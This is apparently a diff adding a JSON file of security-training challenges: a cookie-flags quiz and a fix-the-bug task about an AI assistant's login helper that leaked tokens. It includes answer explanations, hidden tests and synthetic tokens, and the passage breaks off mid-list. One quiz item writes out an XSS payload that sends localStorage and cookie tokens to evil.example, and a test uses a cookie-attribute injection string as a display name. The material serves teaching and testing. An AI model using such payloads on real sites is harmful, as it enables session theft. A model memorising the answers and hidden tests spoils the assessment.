@@ -1,0 +1,1510 @@
+{
+  "challenges": [
+    {
+      "publicId": "chal_quiz_nas_421",
+      "name": "token-cookie-quiz",
+      "type": "quiz",
+      "title": "Which flag protects against what?",
+      "description": "Two pieces of evidence from the review of the AI-written login helper: a refresh cookie with HttpOnly and SameSite but a parent Domain, and an access token moved from localStorage into a cookie while an XSS bug is still open.",
+      "difficulty": "medium",
+      "outcomes": [
+        "session-storage",
+        "attack-mitigation"
+      ],
+      "points": 10,
+      "questions": [
+        {
+          "type": "single_choice",
+          "points": 5,
+          "question": "A first fix of the AI's helper, response of POST https://api.codedev.test/auth/login:\n\nSet-Cookie: refresh_token=rt_Q2xh...; HttpOnly; Secure; SameSite=Strict; Domain=codedev.test; Path=/; Max-Age=1209600\n\nThe community forum runs third-party software on https://forum.codedev.test. A learner opens a forum thread from a link on https://app.codedev.test.\n\nStatement: \"Because the cookie is HttpOnly and SameSite=Strict, the browser does not send refresh_token to forum.codedev.test.\"",
+          "explanation": "False. SameSite is about the site that starts the request, and a site is the registrable domain: app.codedev.test, api.codedev.test and forum.codedev.test are all the same site, codedev.test. HttpOnly only hides the cookie from document.cookie. Which hosts receive the cookie is decided by Domain: Domain=codedev.test sends it to every subdomain, so the forum software, its logs and anyone who controls it see the refresh token. The fix is to drop Domain (a host-only cookie for api.codedev.test) and to narrow Path to /auth/refresh. The misconception is that SameSite separates subdomains.",
+          "options": [
+            {
+              "text": "True",
+              "correct": false
+            },
+            {
+              "text": "False",
+              "correct": true
+            }
+          ]
+        },
+        {
+          "type": "single_choice",
+          "points": 5,
+          "question": "Before the fix, the SPA did:\n\nlocalStorage.setItem(\"access_token\", body.accessToken);\nfetch(url, { headers: { Authorization: `Bearer ${localStorage.getItem(\"access_token\")}` } });\n\nAfter the fix, the access token is only in\n\nSet-Cookie: __Host-cd_at=eyJhbGci...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900\n\nand the SPA calls fetch(url, { credentials: \"include\" }). A course comment still renders unescaped HTML, so this payload runs on app.codedev.test:\n\n<img src=x onerror=\"fetch('https://evil.example/c?t='+localStorage.access_token+document.cookie)\">\n\nStatement: \"After the fix the payload can no longer read the access token, but while the page is open it can still send authenticated requests to the API, for example fetch('https://api.codedev.test/me/email', { method: 'PUT', credentials: 'include', ... }).\"",
+          "explanation": "True. HttpOnly keeps the token out of document.cookie and the token is no longer in localStorage, so the payload cannot copy it to evil.example and replay it later from anywhere. But the script runs inside app.codedev.test, a same-site origin the API trusts with credentials, so the browser attaches the cookie to its requests just as it does for the real SPA. HttpOnly limits XSS to acting during the victim's session; it does not stop XSS. Escaping output and a Content Security Policy are what stop the script from running. The misconception is that HttpOnly cookies make XSS harmless.",
+          "options": [
+            {
+              "text": "True",
+              "correct": true
+            },
+            {
+              "text": "False",
+              "correct": false
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "publicId": "chal_coding_nas_422",
+      "name": "spot-the-ai-mistake-token-cookie",
+      "type": "fix_bug",
+      "title": "Spot the AI Mistake: a token cookie JavaScript can read",
+      "description": "The request sent to an AI coding assistant was: \"Set the auth cookies after login so the frontend can show the user's name.\" It wrote buildLoginResponse for POST https://api.codedev.test/auth/login and changed the SPA to keep body.accessToken in localStorage. Login works, the header says \"Hi, Lan Nguyen\", refresh works, and the pull request was merged. A security review then found that a script on app.codedev.test can read both tokens and that the forum on forum.codedev.test receives the refresh token. Fix buildLoginResponse so it meets the review's list: (1) the body is only { user: { id, displayName } }, no token; (2) the access token is in the cookie __Host-cd_at: hidden from scripts, Secure, sent only to api.codedev.test (every path), SameSite=Lax, Max-Age 900; (3) the refresh token is in the cookie __Secure-cd_rt: hidden from scripts, Secure, sent only to https://api.codedev.test/auth/refresh, SameSite=Strict, Max-Age 1209600; (4) display_name is not sensitive and stays readable by the SPA on app.codedev.test with Domain=codedev.test, Path=/, Secure, SameSite=Lax and Max-Age 1209600, its value encoded with encodeURIComponent. The test runner contains a small browser with the RFC 6265 rules for Domain and Path and the cookie prefix rules (a __Host- or __Secure- cookie that breaks them is rejected), the SPA, and a fake API that accepts the access token as a Bearer header or a cookie. Input: { sessions: [{ user, tokens }], probes: [...] }; the output lists, per learner, the login, then each probe: API calls, stored cookies and their attributes, what a script on app.codedev.test can read, the login body, and the cookies sent to the forum and to an ordinary API path. The public tests pass on the AI's code; the hidden tests check the flags, Path, Domain and prefix rules, the body, and that display_name stays readable. Up to 120 learners per test.",
+      "difficulty": "medium",
+      "outcomes": [
+        "session-storage",
+        "attack-mitigation"
+      ],
+      "points": 30,
+      "hints": [
+        "For each value the response hands to the browser, ask two questions: who can read it (scripts on app.codedev.test, the forum, only the API) and who needs to read it. Which of the three values does the SPA itself actually need?",
+        "Look at the shared attribute string the assistant reused for both cookies, and at the last property of the response body. A Domain attribute makes a cookie go to every subdomain; leaving it out makes it host-only. Then check the prefix rules: __Host- allows only Path=/ and no Domain, __Secure- only requires Secure.",
+        "A similar case on another endpoint: an instructor-preview cookie that only https://api.codedev.test/preview should receive would be `preview_grant=...; HttpOnly; Secure; SameSite=Strict; Path=/preview; Max-Age=600` with no Domain, while a theme cookie the SPA reads on every subdomain would be `theme=dark; Domain=codedev.test; Path=/; Secure; SameSite=Lax`. Only values that are safe to show to any script may skip HttpOnly."
+      ],
+      "coding": {
+        "language": "typescript",
+        "filePath": "main.ts",
+        "executionMode": "stdio",
+        "timeLimitMs": 3000,
+        "memoryLimitMb": 128,
+        "scoringMode": "all_or_nothing",
+        "maxAttempts": null
+      },
+      "tests": [
+        {
+          "name": "Login works: the SPA greets the learner, GET /me and refresh succeed",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_17",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_VEfHBE0V2CVZe_KHqC_28mTf9yeu4jshRFwhxCPBU1M",
+                  "refreshToken": "rt_-oHj2Y-OLXDGcwxEj_IZ5dYRjlSQX8KshHEczsr_FhE"
+                }
+              }
+            ],
+            "probes": [
+              "me",
+              "refresh"
+            ]
+          },
+          "expected": "u_17 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_17 GET /me: 200\nu_17 POST /auth/refresh: 200",
+          "hidden": false,
+          "score": 3
+        },
+        {
+          "name": "Two learners with Vietnamese names sign in, call the API and refresh",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_204",
+                  "displayName": "Lê Thu Hà"
+                },
+                "tokens": {
+                  "accessToken": "at_jy1QS_HSOFx1FXqWylASBZ8ja85QjorAfb2ZOYG5MVc",
+                  "refreshToken": "rt_x1XrrDhv0C1008HVuUNSErGtW8Mwlgv6WzHjq_qNlqc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_318",
+                  "displayName": "Trần Minh Đức"
+                },
+                "tokens": {
+                  "accessToken": "at_tv8X61Domhe4Wpdukdm2wPngq3lQUTIJTE5FjxGkxaY",
+                  "refreshToken": "rt_dniT97DvIrtAebUIijKZYL-h0kc3zPYqCxCOCqWMA3o"
+                }
+              }
+            ],
+            "probes": [
+              "me",
+              "refresh",
+              "me"
+            ]
+          },
+          "expected": "u_204 login: 200, SPA shows \"Hi, Lê Thu Hà\"\nu_204 GET /me: 200\nu_204 POST /auth/refresh: 200\nu_204 GET /me: 200\nu_318 login: 200, SPA shows \"Hi, Trần Minh Đức\"\nu_318 GET /me: 200\nu_318 POST /auth/refresh: 200\nu_318 GET /me: 200",
+          "hidden": false,
+          "score": 3
+        },
+        {
+          "name": "Cookie attributes: HttpOnly, Secure, SameSite, Domain or host-only, Path and Max-Age",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_17",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_VEfHBE0V2CVZe_KHqC_28mTf9yeu4jshRFwhxCPBU1M",
+                  "refreshToken": "rt_-oHj2Y-OLXDGcwxEj_IZ5dYRjlSQX8KshHEczsr_FhE"
+                }
+              }
+            ],
+            "probes": [
+              "cookies"
+            ]
+          },
+          "expected": "u_17 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_17 cookie __Host-cd_at: HttpOnly, Secure, SameSite Lax, host-only api.codedev.test, Path=/, Max-Age=900\nu_17 cookie __Secure-cd_rt: HttpOnly, Secure, SameSite Strict, host-only api.codedev.test, Path=/auth/refresh, Max-Age=1209600\nu_17 cookie display_name: readable by scripts, Secure, SameSite Lax, Domain=codedev.test, Path=/, Max-Age=1209600",
+          "hidden": true,
+          "score": 3
+        },
+        {
+          "name": "No token reaches scripts: document.cookie, localStorage and the login body",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_17",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_VEfHBE0V2CVZe_KHqC_28mTf9yeu4jshRFwhxCPBU1M",
+                  "refreshToken": "rt_-oHj2Y-OLXDGcwxEj_IZ5dYRjlSQX8KshHEczsr_FhE"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_42",
+                  "displayName": "Minh Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_N_YnnA2t7tZ0Rhc6fLlMsbnBn8_08WzTTq6vUayHfWY",
+                  "refreshToken": "rt_W3iaiGXcIFFhddK1RmY6wxHzVzJUPLm6ur77EKC9mWE"
+                }
+              }
+            ],
+            "probes": [
+              "script",
+              "body"
+            ]
+          },
+          "expected": "u_17 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_17 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_17 login body: user Lan Nguyen, tokens in body: none\nu_42 login: 200, SPA shows \"Hi, Minh Tran\"\nu_42 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_42 login body: user Minh Tran, tokens in body: none",
+          "hidden": true,
+          "score": 3
+        },
+        {
+          "name": "Other subdomains get no token; the refresh cookie stays off ordinary API paths",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_17",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_VEfHBE0V2CVZe_KHqC_28mTf9yeu4jshRFwhxCPBU1M",
+                  "refreshToken": "rt_-oHj2Y-OLXDGcwxEj_IZ5dYRjlSQX8KshHEczsr_FhE"
+                }
+              }
+            ],
+            "probes": [
+              "forum",
+              "paths",
+              "refresh"
+            ]
+          },
+          "expected": "u_17 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_17 forum.codedev.test receives: [display_name], tokens exposed: none\nu_17 GET /courses/42 carries: [__Host-cd_at, display_name]\nu_17 POST /auth/refresh: 200",
+          "hidden": true,
+          "score": 3
+        },
+        {
+          "name": "Hostile and empty display names stay one readable, encoded cookie",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_90",
+                  "displayName": "Eve; Domain=evil.example; HttpOnly"
+                },
+                "tokens": {
+                  "accessToken": "at_TOnXxUO645-Jc_-FDGWifknrTy8e-GmgJ9vnUpSOMbU",
+                  "refreshToken": "rt_1_uOslUNs16l39Abeg7-QawAmBLs4s1GCUuNZy0cuoU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_91",
+                  "displayName": ""
+                },
+                "tokens": {
+                  "accessToken": "at_GdcQ2X9pZ9WT-io7xeyFAZjnmA56bbZhvRdhz3biuMo",
+                  "refreshToken": "rt_27L6pN1BddbltSgZtxHMDP9iT7LRNltQnccyuFFUeds"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_92",
+                  "displayName": "100% = \"fun\""
+                },
+                "tokens": {
+                  "accessToken": "at_riv7SZ3Ktg-hNIgoJyRgIib0qdkSeeQGitFkKuuersc",
+                  "refreshToken": "rt_O5mRJEMSNbCOkGvlPmBbwWVvHr-Dr5wfy1BJ224n1fc"
+                }
+              }
+            ],
+            "probes": [
+              "script",
+              "cookies",
+              "body"
+            ]
+          },
+          "expected": "u_90 login: 200, SPA shows \"Hi, Eve; Domain=evil.example; HttpOnly\"\nu_90 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_90 cookie __Host-cd_at: HttpOnly, Secure, SameSite Lax, host-only api.codedev.test, Path=/, Max-Age=900\nu_90 cookie __Secure-cd_rt: HttpOnly, Secure, SameSite Strict, host-only api.codedev.test, Path=/auth/refresh, Max-Age=1209600\nu_90 cookie display_name: readable by scripts, Secure, SameSite Lax, Domain=codedev.test, Path=/, Max-Age=1209600\nu_90 login body: user Eve; Domain=evil.example; HttpOnly, tokens in body: none\nu_91 login: 200, SPA shows \"Hi, there\"\nu_91 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_91 cookie __Host-cd_at: HttpOnly, Secure, SameSite Lax, host-only api.codedev.test, Path=/, Max-Age=900\nu_91 cookie __Secure-cd_rt: HttpOnly, Secure, SameSite Strict, host-only api.codedev.test, Path=/auth/refresh, Max-Age=1209600\nu_91 cookie display_name: readable by scripts, Secure, SameSite Lax, Domain=codedev.test, Path=/, Max-Age=1209600\nu_91 login body: user , tokens in body: none\nu_92 login: 200, SPA shows \"Hi, 100% = \"fun\"\"\nu_92 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_92 cookie __Host-cd_at: HttpOnly, Secure, SameSite Lax, host-only api.codedev.test, Path=/, Max-Age=900\nu_92 cookie __Secure-cd_rt: HttpOnly, Secure, SameSite Strict, host-only api.codedev.test, Path=/auth/refresh, Max-Age=1209600\nu_92 cookie display_name: readable by scripts, Secure, SameSite Lax, Domain=codedev.test, Path=/, Max-Age=1209600\nu_92 login body: user 100% = \"fun\", tokens in body: none",
+          "hidden": true,
+          "score": 2
+        },
+        {
+          "name": "Every probe for one learner after the fix",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_555",
+                  "displayName": "Phạm Thị Ngọc Ánh"
+                },
+                "tokens": {
+                  "accessToken": "at_nYTWylu31FyoeAMVvZs375TBdoDzOwEqvhgYGhXvjko",
+                  "refreshToken": "rt_Lshm06-ZWzzlx8qwP-kz6KnWBABYhnt6lLC3Nl7Wi7M"
+                }
+              }
+            ],
+            "probes": [
+              "me",
+              "refresh",
+              "cookies",
+              "script",
+              "body",
+              "forum",
+              "paths"
+            ]
+          },
+          "expected": "u_555 login: 200, SPA shows \"Hi, Phạm Thị Ngọc Ánh\"\nu_555 GET /me: 200\nu_555 POST /auth/refresh: 200\nu_555 cookie __Host-cd_at: HttpOnly, Secure, SameSite Lax, host-only api.codedev.test, Path=/, Max-Age=900\nu_555 cookie __Secure-cd_rt: HttpOnly, Secure, SameSite Strict, host-only api.codedev.test, Path=/auth/refresh, Max-Age=1209600\nu_555 cookie display_name: readable by scripts, Secure, SameSite Lax, Domain=codedev.test, Path=/, Max-Age=1209600\nu_555 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_555 login body: user Phạm Thị Ngọc Ánh, tokens in body: none\nu_555 forum.codedev.test receives: [display_name], tokens exposed: none\nu_555 GET /courses/42 carries: [__Host-cd_at, display_name]",
+          "hidden": true,
+          "score": 2
+        },
+        {
+          "name": "Large: 120 learners sign in; scripts and the forum see no token",
+          "input": {
+            "sessions": [
+              {
+                "user": {
+                  "id": "u_1000",
+                  "displayName": "Lan Nguyen (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_wnf-VshA1hJ36huXPHuvO3kcphPwAi1Cc5tSFRjGvok",
+                  "refreshToken": "rt_3_fgBDoIbfFEsOs4wxIrbp9foAmWY_JVpTcQb35RCqc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1001",
+                  "displayName": "Minh Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_BKQ_D5ZIGsbeWYjRnT3h3ZhuGtUxhNQiKMZFdTsxd74",
+                  "refreshToken": "rt_qpmWU0Vz-m3YuHxqHFx0-Nz5fAp-OH_SksNtgb7nEps"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1002",
+                  "displayName": "Thu Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_ELi_-P7SfGIiR4ozBkd-YQwa3ArxpnFV8efLSDePNVE",
+                  "refreshToken": "rt_le4sETkMIv9AQ8S_gfTNDApvJheZkGnaKQN3JdsHvJ4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1003",
+                  "displayName": "Huy Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_3t3K6mbiTi-CL-POCZuQ8lATo7evNWZpzzdbnSNpHEo",
+                  "refreshToken": "rt_djaD4uHWEZCApy4Xg_SzsV0WLhOlcmy49LGnx1fqCqE"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1004",
+                  "displayName": "Mai Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_9A05j5X_cDuPHLfZ-g4XMDj_WHEh0w59QmQ11Xp-ZLo",
+                  "refreshToken": "rt_SjPAfFHST6KNL1y3zYkUIfLOTSKNcvtULX6cAcPI330"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1005",
+                  "displayName": "Khoa Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_2PpBaMMimSs9mLedKzAUR0DI7yDo5_s1F0SnO6WixoU",
+                  "refreshToken": "rt_cruca-eI1Twh9GTxV0rR18ts7PEIGd259eT3KK-V5R8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1006",
+                  "displayName": "Linh Le"
+                },
+                "tokens": {
+                  "accessToken": "at_yK6NEVCd7g8tGzqcrPxZFKjZJksFKN7vwmbTUJxt2HM",
+                  "refreshToken": "rt_ag9j_utfckxVYbj56KipELxX4PqMb_32kKSG-bvKgSY"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1007",
+                  "displayName": "Duc Bui (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_B7jROLEyWB4WTD5zkiBWfy77ZS3g5gIH7vxpw_uw07s",
+                  "refreshToken": "rt_7gHN2MDos-NVIPLrOMnLlWtVB46WP5B6Hh-SU1cpens"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1008",
+                  "displayName": "An Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at__NEkisi5iWeCC_KG3z_gO4wPQbLWDE6sRWxrMsPS3rI",
+                  "refreshToken": "rt_zVPHPRw7vNV98lpG6Xhk-Vn0o80wPk_y2u8SUu7nttY"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1009",
+                  "displayName": "Bao Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_7CdqkeaW1Qi3UF4mdzI7TbyGDNdRKI2dcJ8KmCvikRI",
+                  "refreshToken": "rt_dKEZkWRGt8Or5L4l53p8bX8jrbaFzOLU33GPiwY_XI8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1010",
+                  "displayName": "Chi Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_7uBxLbAOe9W7ESfGBAYUBDJZE9KMKSTmwaO9ua4ryKY",
+                  "refreshToken": "rt_XLHaf-47aKxqQQp01_QzsN52JCw_81w32IGPMoJiaz0"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1011",
+                  "displayName": "Phuong Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_5_WSLXsiiEcA8lwgfQ-FKo_fcTaCb3d6haHEs9ye3WM",
+                  "refreshToken": "rt_Bmx2eFm_QMBKvksuVlxl8y8ry2qHLtnXqFoaOUILlPA"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1012",
+                  "displayName": "Lan Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_2zk1Z1x0tnxSARI3yOVzcisEnkJrVTjCRPsTxHoaaQE",
+                  "refreshToken": "rt_uCWESM8eWv2aoYjYpG04qdVuCBCHgFp1dULzvL0vR7M"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1013",
+                  "displayName": "Minh Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_yVptpO5Lu6p1nuS033CSY4RCYIPbJf_Vu1FfpVFUucI",
+                  "refreshToken": "rt_zvDo-rRl9Ya59Rg6sLNO64mMAOBeDDUgt_nTaR6KATk"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1014",
+                  "displayName": "Thu Dang (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_xMPifcOEu5_32fwbFhgKioQG0nE3QK0IcdpBZRo8yDY",
+                  "refreshToken": "rt_u1nRzldpRkFIpWd0AhHumo16cCyvRb8LWWEo0ifoc8U"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1015",
+                  "displayName": "Huy Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_OGAIdTFJpM8_SGS3S3YWlFLebVbJnty6_yImzahjLlM",
+                  "refreshToken": "rt_eXBAnEvm6ky2I0CTzeFtR1DKBNPqQHbKftFFxepFleo"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1016",
+                  "displayName": "Mai Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_4-40OC5HN72Jq62Gn0tU03E_01saT6UaMijHz5MioHE",
+                  "refreshToken": "rt_6NDyyD3COwSCJu1iTlx3roMKQ3cyl-0SKMJ1xkNiPYY"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1017",
+                  "displayName": "Khoa Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_oYJrDMxKUlkP5tWwN4OuAu93aTDdxfEBrZ1PSmoONLk",
+                  "refreshToken": "rt_aVB1x9ZbMgZCKu0IA712tHOlT77h_Wo5RxEA1Ls_oT0"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1018",
+                  "displayName": "Linh Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_v-Pj_Q91Is0oZGclzMF_fsNYsw1tEU7MJbB4KNvubho",
+                  "refreshToken": "rt_g2Trzlb64_xqqUihZlAiG3CyYGJBbo-JqzVc9KvSJ2w"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1019",
+                  "displayName": "Duc Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_sxggh3ph3ZCRphIFF_TN0vubb58SiF9eWFO5fAy7oqk",
+                  "refreshToken": "rt_mNwAfeM46-oTYjGhXdySrIT6qYRDgle8nF-7_3Ua8ys"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1020",
+                  "displayName": "An Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_rjQL-PYnPwz2B8rNzQuqj5DiuRpTGz77cTiXzPL5hbA",
+                  "refreshToken": "rt_ePlPA4Vg4Y8cTsbvaUnq6YcQUUFNFD8TjldCbxiHxI4"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1021",
+                  "displayName": "Bao Vo (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_XOZmFZxQPgfAmIrkbYyzJ6qryWlC0u8Hz10YMd2v2yU",
+                  "refreshToken": "rt_uH77AR7gGH3m26y-WDz5r-wWoOCu83rSEmpp5VujVcM"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1022",
+                  "displayName": "Chi Le"
+                },
+                "tokens": {
+                  "accessToken": "at_NXL66uVRax0aXzteuA1mHywd96EtZdXQkFKRHMUyhdI",
+                  "refreshToken": "rt_Qb6QDgK6RIhKKmSBHpfUTHVURZbu_s8xfoCY0YdfWwk"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1023",
+                  "displayName": "Phuong Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_k33BSrOSMUy2ytXuWHZSOcLE8scZaMQN0XF3RtMQBhE",
+                  "refreshToken": "rt_k_MZzzKX63I4Qv8lxW3WyHGfi6kmSN-2c1yg0JyQ-eo"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1024",
+                  "displayName": "Lan Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_NY51ks2YySTGrfZPAP-lKrdCsv1IQRsplHAhpriWVY4",
+                  "refreshToken": "rt_nw_n4NSSUl2WT51QA4pNLkCDuuAdfjv1F3bcIMUaB8k"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1025",
+                  "displayName": "Minh Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_Mt6ubbi-B6rYp849tSL4MyHZespksMWVJ7Iv3kOkPx4",
+                  "refreshToken": "rt_FazK9_2EmLmdbJEbLq4-VRnbkNYjSexJIU8kG1rLzp8"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1026",
+                  "displayName": "Thu Dang"
+                },
+                "tokens": {
+                  "accessToken": "at__2UIGuwYUAQML6eje-ErYtAyTCYwNfvQ4KJotrkH0vc",
+                  "refreshToken": "rt_tcW7bdOh27_M147gd3MSh1MCLn7k-kiy2MhhfAMB17c"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1027",
+                  "displayName": "Huy Tran"
+                },
+                "tokens": {
+                  "accessToken": "at_cXqp7HZPreCdeduUAYYx0X8lbn6QwEHmUGaA6HIMWKk",
+                  "refreshToken": "rt_hIGRPJ_dIh3c22OwT1YCdlSqEkcewdaCJQsu1iQ-OkM"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1028",
+                  "displayName": "Mai Hoang (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_WiHpigyj2Y27-WtxYBW4pbGNGMdWWxN4Lp7i_2GcyBQ",
+                  "refreshToken": "rt_ZjTVJkutobvoFqyOd0KWI9VIJ47VkSJQIN6Cgu2GyHE"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1029",
+                  "displayName": "Khoa Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_78EzSrjmGXOffAgq3V1qz_2YtYHCaF_HpWMP67AOFoc",
+                  "refreshToken": "rt_mJHzNGBS6157qm2P0JjjLyRkryGuoVQnK86Jsr6gUnU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1030",
+                  "displayName": "Linh Le"
+                },
+                "tokens": {
+                  "accessToken": "at_PNopgKjg7kF-R0Fdgkh4VnDusGvvWTlnMPG3MLd6Fv4",
+                  "refreshToken": "rt_o_M3Vrl52SeJ_EL945HzRyKRJQNQ4FS-MTrOeg89qUc"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1031",
+                  "displayName": "Duc Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_Z0DU3TALTgngn8ezfbrmpTdScWndegu8pRR_xLqVKLg",
+                  "refreshToken": "rt_Z3MneWNt8hiv6tQFTUgxa8x4f6NYCDAI3JeWYghP0iU"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1032",
+                  "displayName": "An Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_121V2G1IlZsQqL_2o8SJuKR-CXVwIEnLxy8ojRe99Z4",
+                  "refreshToken": "rt_q1bmq8jWXYGaJV4erRFFQNNat_eOK5NCSqQ8wXyloDA"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1033",
+                  "displayName": "Bao Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_Knjs64AqhYEYIo2HisCN8rz1YLBdU0yJy27pzFeTrnM",
+                  "refreshToken": "rt_N4PtXJGrtV0DIwbHjSqqz9uRYjxY2H2gycTNaC8k6Kw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1034",
+                  "displayName": "Chi Dang"
+                },
+                "tokens": {
+                  "accessToken": "at_TGtemiNyznCTWDYb5vaukRQIb2UouQxxRRuPOlnn090",
+                  "refreshToken": "rt_icWW3sVOPDtgDO0UhcZ7ICM7WdZSsFlZypZEosaoeKw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1035",
+                  "displayName": "Phuong Pham (mentor)"
+                },
+                "tokens": {
+                  "accessToken": "at_VCySRj0q9LopDNXYnyzdSkqKqTxU64wveDOmoOjDOtg",
+                  "refreshToken": "rt_9cboQJTrK0JyFNPfoODiGXyppj8-TZKkgOPozGE4Mrs"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1036",
+                  "displayName": "Lan Hoang"
+                },
+                "tokens": {
+                  "accessToken": "at_FLoV_b_amEMpceR_GHq3Et5qlLhPEkzvckY7gaKB4R0",
+                  "refreshToken": "rt_-KJ7vVpxF55H8FgvFCh1VlIUco4HRXiDNvr_OPjaKAw"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1037",
+                  "displayName": "Minh Bui"
+                },
+                "tokens": {
+                  "accessToken": "at_9YkSh1_oOuhPeJjYKJVRJFzGKHs61BBdMMc7jCvFV-0",
+                  "refreshToken": "rt_Zq0IXQZvb9Q0Cph9oxmKAPMV2EYQqa29FXB9FdebKt0"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1038",
+                  "displayName": "Thu Le"
+                },
+                "tokens": {
+                  "accessToken": "at_FCa1mUX4uu7JUEF0R90tOmS_rg0aGIrs0prAJpni9CI",
+                  "refreshToken": "rt_MpqWunR5ryikIGpCE1b6rn0d5IdMu147RPbL0sgOr7s"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1039",
+                  "displayName": "Huy Vo"
+                },
+                "tokens": {
+                  "accessToken": "at_hVuZEQTEcSWzDs7vuRQYZF6Z9GUGIoKKknY-GKG7Pqk",
+                  "refreshToken": "rt_na63SRLhfokZ3KxYvqLETRCnkASD3-3mgoQFx6cnrlk"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1040",
+                  "displayName": "Mai Nguyen"
+                },
+                "tokens": {
+                  "accessToken": "at_42cy0CDllh-QZPIyrsEmUmchhNaII4QSCj_i-0ySbGM",
+                  "refreshToken": "rt__YDBsG20niDGxY_4iLzMyPHorIpba6BNzqRJqSKOJhQ"
+                }
+              },
+              {
+                "user": {
+                  "id": "u_1041",
+                  "displayName": "Khoa Pham"
+                },
+                "tokens": {
+                  "accessToken": "at_YGn_nBFJ1YNRz0Zxu2z5SfzEOE4VoSp_XCvOrP1WNs8",
+                  "refreshToken": "rt_BrOlqepmftZAZXb89r6nOQWoNgruWgYZDRD1JZn-OHo"
+                }
+              },
+              {
+                "user": {
